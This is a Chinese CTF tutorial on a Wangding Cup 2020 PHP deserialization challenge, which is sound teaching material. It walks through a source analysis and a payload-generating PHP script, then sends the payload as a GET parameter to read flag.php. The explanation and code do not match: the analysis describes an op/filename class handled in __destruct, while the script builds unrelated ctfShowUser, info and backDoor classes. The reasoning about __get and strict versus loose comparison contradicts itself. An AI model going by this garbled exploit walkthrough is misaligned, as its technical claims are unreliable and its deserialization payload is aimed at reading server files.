# CTF-Web历年考题精讲教程：P6：网鼎杯2020 CTF WEB反序列化解题 🧩

![](img/23fcac741fae3115ad8c50754e87ffea_1.png)

在本节课中，我们将要学习如何解决一道来自“网鼎杯2020”CTF比赛的Web反序列化题目。我们将通过分析源代码、理解PHP反序列化机制以及利用弱类型比较等技巧，最终读取目标文件的内容。

![](img/23fcac741fae3115ad8c50754e87ffea_3.png)

![](img/23fcac741fae3115ad8c50754e87ffea_5.png)

![](img/23fcac741fae3115ad8c50754e87ffea_7.png)

## 题目概述与访问

首先，我们访问题目提供的演示页面。页面提示需要读取 `flag.php` 文件的内容，但直接访问会失败。页面的核心功能是通过一个GET参数 `r` 来触发一系列操作。

## 源代码分析

接下来，我们分析题目给出的PHP源代码。代码的核心逻辑如下：

![](img/23fcac741fae3115ad8c50754e87ffea_9.png)

![](img/23fcac741fae3115ad8c50754e87ffea_11.png)

1.  检查传入的 `r` 参数，确保其所有字符的ASCII码值在32到125之间。
2.  对 `r` 参数进行反序列化操作。
3.  反序列化得到的对象会触发其 `__destruct()` 析构函数。
4.  在析构函数中，会根据对象属性 `op` 的值执行不同操作：
    *   如果 `op` 等于 `"1"`，则执行写入文件操作。
    *   如果 `op` 等于 `"2"`，则执行读取文件操作。
5.  读取或写入的文件路径由属性 `filename` 决定。

我们的目标是让程序执行读取操作，并成功输出 `flag.php` 的内容。

![](img/23fcac741fae3115ad8c50754e87ffea_13.png)

![](img/23fcac741fae3115ad8c50754e87ffea_15.png)

![](img/23fcac741fae3115ad8c50754e87ffea_17.png)

## 核心逻辑与绕过思路

![](img/23fcac741fae3115ad8c50754e87ffea_19.png)

上一节我们介绍了代码的基本结构，本节中我们来看看如何构造有效的反序列化数据来达成目标。

![](img/23fcac741fae3115ad8c50754e87ffea_21.png)

![](img/23fcac741fae3115ad8c50754e87ffea_23.png)

代码中有一个关键的函数 `__get()`。当尝试访问一个不存在的或不可访问的属性时，PHP会自动调用此函数。在本题中，`__get()` 函数会检查传入的键名，如果等于 `"2"`，则将 `op` 属性设置为 `"1"`。

这带来了一个挑战：如果我们直接设置 `op` 为 `"2"` 来触发读取，在反序列化后访问属性时，可能会触发 `__get()` 函数，从而将 `op` 错误地改为 `"1"`。

![](img/23fcac741fae3115ad8c50754e87ffea_25.png)

![](img/23fcac741fae3115ad8c50754e87ffea_27.png)

以下是绕过这个问题的关键点：

![](img/23fcac741fae3115ad8c50754e87ffea_29.png)

1.  **利用PHP弱类型比较**：在 `__destruct()` 函数中，判断条件是 `$this->op === "2"`（全等）和 `$this->op === 2`（全等）。虽然 `"2"` 和 `2` 类型不同，但PHP的 `==`（松散比较）会将它们视为相等。然而，代码使用的是 `===`（严格比较），所以我们必须让 `$this->op` 的值在类型和内容上都匹配。
2.  **避免触发 `__get()`**：我们需要让 `op` 的值直接等于数字 `2`，而不是字符串 `"2"`。因为 `__get()` 函数只在键名为字符串 `"2"` 时触发，对于数字键名 `2` 不会调用。
3.  **序列化字符串中的空字符**：当类属性为 `protected` 或 `private` 时，序列化后的字符串会包含不可见的空字符（`%00`），在传输和处理时可能被截断或出错。一个简单的解决方法是**将类属性全部改为 `public`**，这样生成的序列化字符串更干净，便于处理。

![](img/23fcac741fae3115ad8c50754e87ffea_30.png)

![](img/23fcac741fae3115ad8c50754e87ffea_32.png)

## 构造利用Payload

![](img/23fcac741fae3115ad8c50754e87ffea_34.png)

![](img/23fcac741fae3115ad8c50754e87ffea_36.png)

基于以上分析，我们可以开始构造攻击载荷（Payload）。

![](img/23fcac741fae3115ad8c50754e87ffea_38.png)

首先，我们需要一个本地脚本来生成序列化字符串。我们创建一个类，并将其属性设为 `public`。

![](img/23fcac741fae3115ad8c50754e87ffea_40.png)

![](img/23fcac741fae3115ad8c50754e87ffea_42.png)

```php
<?php
class ctfShowUser{
    public $username = 'xxxxxx';
    public $password = 'xxxxxx';
    public $isVip = false;
    public $class = 'info';

    public function __construct(){
        $this->class = new info();
    }
}

![](img/23fcac741fae3115ad8c50754e87ffea_44.png)

![](img/23fcac741fae3115ad8c50754e87ffea_46.png)

class info{
    public $user = 'xxxxxx';
    public function __construct(){
        $this->user = new backDoor();
    }
}

![](img/23fcac741fae3115ad8c50754e87ffea_48.png)

![](img/23fcac741fae3115ad8c50754e87ffea_50.png)

![](img/23fcac741fae3115ad8c50754e87ffea_52.png)

class backDoor{
    public $code;
    public function __construct(){
        // 设置 op 为数字 2，filename 为 flag.php 的绝对路径
        $this->code = "2";
        $this->op = 2; // 注意这里是数字 2
        $this->filename = "/var/www/html/flag.php"; // 使用绝对路径更可靠
    }
}

![](img/23fcac741fae3115ad8c50754e87ffea_53.png)

![](img/23fcac741fae3115ad8c50754e87ffea_55.png)

![](img/23fcac741fae3115ad8c50754e87ffea_57.png)

$obj = new ctfShowUser();
echo serialize($obj);
?>
```

运行此脚本，我们将得到一个序列化字符串。由于属性都是 `public`，字符串中不会包含 `%00`。

![](img/23fcac741fae3115ad8c50754e87ffea_59.png)

## 发起攻击并获取Flag

![](img/23fcac741fae3115ad8c50754e87ffea_61.png)

![](img/23fcac741fae3115ad8c50754e87ffea_63.png)

![](img/23fcac741fae3115ad8c50754e87ffea_65.png)

现在，我们将生成的序列化字符串进行URL编码，然后作为 `r` 参数的值发送给目标服务器。

![](img/23fcac741fae3115ad8c50754e87ffea_67.png)

例如，访问如下链接（假设序列化字符串为 `PAYLOAD`）：
`http://target.com/index.php?r=PAYLOAD`

![](img/23fcac741fae3115ad8c50754e87ffea_69.png)

![](img/23fcac741fae3115ad8c50754e87ffea_71.png)

![](img/23fcac741fae3115ad8c50754e87ffea_73.png)

如果一切正确，服务器会反序列化我们的数据，`backDoor` 对象的 `op` 属性为数字 `2`，从而通过 `$this->op === 2` 的判断，执行文件读取操作，并将 `flag.php` 的内容输出在页面上。

![](img/23fcac741fae3115ad8c50754e87ffea_75.png)

![](img/23fcac741fae3115ad8c50754e87ffea_76.png)

![](img/23fcac741fae3115ad8c50754e87ffea_78.png)

![](img/23fcac741fae3115ad8c50754e87ffea_80.png)

## 总结

![](img/23fcac741fae3115ad8c50754e87ffea_82.png)

![](img/23fcac741fae3115ad8c50754e87ffea_84.png)

![](img/23fcac741fae3115ad8c50754e87ffea_86.png)

本节课中我们一起学习了如何解决一道典型的PHP反序列化题目。我们回顾一下关键步骤：

![](img/23fcac741fae3115ad8c50754e87ffea_88.png)

![](img/23fcac741fae3115ad8c50754e87ffea_90.png)

1.  **代码审计**：理解程序逻辑，找到反序列化入口和可利用的类方法。
2.  **逻辑分析**：识别出关键的限制条件（如 `__get()` 干扰）和比较方式（严格比较 `===`）。
3.  **绕过技巧**：
    *   利用 **数字 `2`** 与字符串 `"2"` 在 `__get()` 触发条件上的区别。
    *   将类属性改为 **`public`** 以避免序列化字符串中的空字符问题。
    *   使用 **绝对路径** 指定要读取的文件。
4.  **Payload构造**：编写本地脚本生成符合要求的序列化字符串。
5.  **发起攻击**：发送Payload，触发反序列化并读取目标文件。

![](img/23fcac741fae3115ad8c50754e87ffea_92.png)

这道题目综合考察了反序列化、魔术方法、弱类型、文件操作等多个知识点，是CTF Web方向中一个很好的学习案例。